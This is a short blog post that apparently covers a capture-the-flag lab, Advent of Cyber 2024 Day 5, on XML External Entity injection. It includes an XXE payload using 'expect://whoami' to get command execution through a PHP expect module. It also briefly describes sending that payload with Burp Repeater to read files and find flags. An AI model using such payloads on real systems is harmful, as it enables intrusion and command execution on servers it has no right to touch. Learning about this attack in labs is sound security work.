---
title: 'Advent of Cyber 2024 - Day 5'
author: 'Stefenmarg'
layout: 'Layouts/Post'
date: "2024-12-05"
---

<img class="img-fluid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730807266344.png">

### Topic Covered: XML External Entity (XXE)

This post should have been released earlier but an i did not manage to fix the url and base url situation in time for the release of Day 5's post.

An XML Exteernal Entity is a placeholder for a set of data that can be loaded with data from either Internal or External files to be shared between 2 entities that have agreed to use XML to communicate.

```xml
<!DOCTYPE people [
    <!ENTITY externalEntity SYSTEM "WebsiteFromWhichToImportData">
]>
<person>
    <name>Stefanos</name>
    <nickname>Stefenmarg</nickname>
    <email>stefenmarg@protonmail.com</email>
    <tel>&externalEntity;</tel>
</person>

```

With these external objects IF the module 'expect' for PHP is loaded you are able to get an RCE (Remote Code Execution) by modifing the snippet above!

```xml
<!DOCTYPE people [
    <!ENTITY externalEntity SYSTEM "expect://whoami">
]>
<person>
    <name>Stefanos</name>
    <nickname>Stefenmarg</nickname>
    <email>stefenmarg@gmail.com</email>
    <tel>&externalEntity;</tel>
</person>
```

In our case the above expample will run the whoami command and return the output of the command.

For this we used the [Burp Suite by PortSwigger](https://portswigger.net/burp) and it's ability to act as a repeater. We creted a new request with the payload and sent the brand new and tottaly not malicious request to the wishlist resulting in a return test to contain the result of the command written.

With this process of payloads we werea ble to read the wishes in their directory and get our first flag.

The other flag was easier to find sue to the fack that it was located in the changelog of the site by MM who supposedly was the one to enable the exploit at the first place.

Every day we learn something new and this only strengthens my want to complete all these challenges.